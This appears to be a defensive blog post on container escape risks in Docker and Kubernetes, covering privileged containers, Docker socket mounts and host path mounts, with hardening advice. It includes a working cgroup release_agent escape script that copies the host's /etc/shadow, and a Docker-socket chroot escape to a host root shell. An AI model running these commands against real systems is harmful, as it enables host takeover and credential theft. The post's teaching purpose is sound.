---
title: "🏃 Container Escape: The Attack Surface You're Pretending Doesn't Exist"
date: "2026-06-27"
excerpt: "Containers are not virtual machines. That mental model mismatch is exactly what attackers exploit to break out of your 'isolated' workloads and own the host."
tags:
  - security
  - containers
  - docker
  - kubernetes
  - infrastructure
featured: true
---

Here's a sentence that will haunt you: **your container is not a security boundary**.

I know. It feels wrong. You've got namespaces, cgroups, a read-only root filesystem, and a smug sense of isolation. But containers share the host kernel. That single fact is the thread attackers pull on when they want to go from "I'm stuck in a PHP container" to "I'm root on your node and I'd like to see your secrets, please."

This is a post about the container escape attack surface — not the theoretical kind, but the mistakes that show up in real Kubernetes clusters and Docker setups every week.

## The Mental Model Problem

VMs get a hypervisor. The hypervisor mediates every hardware interaction. A compromised VM can't reach the host without compromising the hypervisor itself.

Containers get **namespaces and cgroups** — kernel features that provide isolation *within* the same kernel. No hypervisor. No hardware boundary. If an attacker finds a kernel exploit, or if your container is misconfigured enough to weaken those namespace walls, they're on the host.

The attack surface breaks down into a few well-understood categories. Let's walk through the ones that keep appearing in incident reports.

## Escape Vector 1: The Privileged Container

Running `--privileged` is the nuclear option. It disables almost all Linux security features for that container: it gets nearly all capabilities, all devices become accessible, and the seccomp/AppArmor profiles are relaxed. It's the container equivalent of running `chmod 777` on your security model.

The classic escape from a privileged container via `cgroups`:

```bash
# Inside a --privileged container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/shadow_stolen" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
# /shadow_stolen now exists on the HOST
```

This works because a privileged container can manipulate cgroup release agents, which run as root *on the host* — outside the container entirely.

**Fix**: Never run `--privileged` unless you're building container tooling. If you think you need it, you almost certainly need a specific capability instead (`CAP_NET_ADMIN`, `CAP_SYS_PTRACE`, etc.).

## Escape Vector 2: The Docker Socket Mount

This one is more common than it should be. Mounting `/var/run/docker.sock` into a container gives that container full control over the Docker daemon — which runs as root on the host.

```yaml
# This is a loaded gun pointed at your host
volumes:
  - /var/run/docker.sock:/var/run/docker.sock
```

Once an attacker has the socket, the escape is trivial:

```bash
# Inside a container with /var/run/docker.sock mounted
docker run -it --rm \
  -v /:/host \
  ubuntu \
  chroot /host bash
# Congratulations, you're root on the host
```

At Cubet, we audited a client's staging Kubernetes cluster and found three deployments with the Docker socket mounted — all for "convenience" in CI sidecar containers that hadn't been cleaned up after a pipeline migration. The socket was exposed inside pods that also had egress to the internet. Not great.

**Fix**: Use rootless Docker or Podman for workloads that genuinely need container management. For Kubernetes, use the container runtime API (via service accounts with tight RBAC) rather than the raw socket.

## Escape Vector 3: Sensitive Host Path Mounts

Mounting host paths like `/proc`, `/sys`, or `/` is an obvious footgun, but some less obvious mounts are just as dangerous.

Mounting the host `/proc` gives access to `sysrq`, memory maps of host processes, and a path to read host secrets. Mounting `/etc/cron.d` from the host into a container lets a compromised container write cron jobs that run as root on the host.

```yaml
# Audit your Helm charts and manifests for these patterns:
volumes:
  - hostPath:
      path: /proc          # direct host kernel access
  - hostPath:
      path: /etc           # host config files
  - hostPath:
      path: /var/log       # log injection back to host
```

The harder-to-spot version: mounting `/var/lib/kubelet` gives access to service account tokens for *other* pods on the node. That's a lateral movement dream.

**Fix**: Use `PodSecurityAdmission` (or a policy engine like Kyverno/OPA Gatekeeper) to enforce `hostPath` restrictions cluster-wide. Don't rely on developers knowing which paths are dangerous.

## What Actually Stops Escapes

Mitigations operate in layers:

**1. Drop capabilities aggressively**
```yaml
securityContext:
  capabilities:
    drop:
      - ALL
    add:
      - NET_BIND_SERVICE  # only what you actually need
  runAsNonRoot: true
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
```

**2. Use seccomp profiles**

The default Docker/Kubernetes seccomp profile blocks ~44 syscalls. A custom profile for your workload can be much tighter. If your app is a web server, it has no business calling `ptrace` or `mount`.

**3. Enable AppArmor/SELinux**

Both Kubernetes and Docker support these MAC systems. They constrain what files, capabilities, and network operations a container can perform — even if the container is compromised.

**4. Enforce with admission control**

Runtime security context settings are meaningless if a developer can deploy a `--privileged` pod because no one enforced the policy. Kubernetes 1.25+ ships `PodSecurityAdmission` in stable — use the `restricted` profile as your baseline and carve exceptions deliberately.

**5. Runtime detection**

Falco (CNCF) watches kernel syscalls and fires alerts when a container does something unexpected — reads `/etc/shadow`, spawns a shell from a web process, writes to `/proc`. It won't prevent an escape but it'll tell you it happened, which is underrated.

## The Kernel Is the Final Boss

All of the above assumes the kernel itself isn't exploitable. It sometimes is. Dirty Pipe (CVE-2022-0847), Dirty COW (CVE-2016-5195), and runc CVEs like CVE-2019-5736 have all enabled container escapes from relatively hardened setups.

The mitigations: keep your kernel patched obsessively, prefer managed node groups (GKE, EKS, AKS) where the cloud provider handles kernel updates, and use gVisor or Kata Containers if you need a real sandbox boundary for untrusted workloads. gVisor intercepts syscalls in userspace so exploiting the Linux kernel from inside a gVisor container requires exploiting gVisor *and* then the kernel — a much harder bar.

## The Real Takeaway

Container security is defense in depth, not a single control. A misconfigured privileged container can undo every other control in your cluster. The attack surface is real, well-documented, and actively exploited.

Start with `kubectl get pods --all-namespaces -o json | jq '.. | .securityContext? | select(.privileged == true)'` on your current cluster. If anything comes back, you've got work to do.

---

Found a misconfigured container in the wild recently? Disagree with my take on gVisor vs Kata? Come argue with me on [Twitter/X](https://twitter.com/kpanuragh) or [LinkedIn](https://linkedin.com/in/kpanuragh). I read everything.
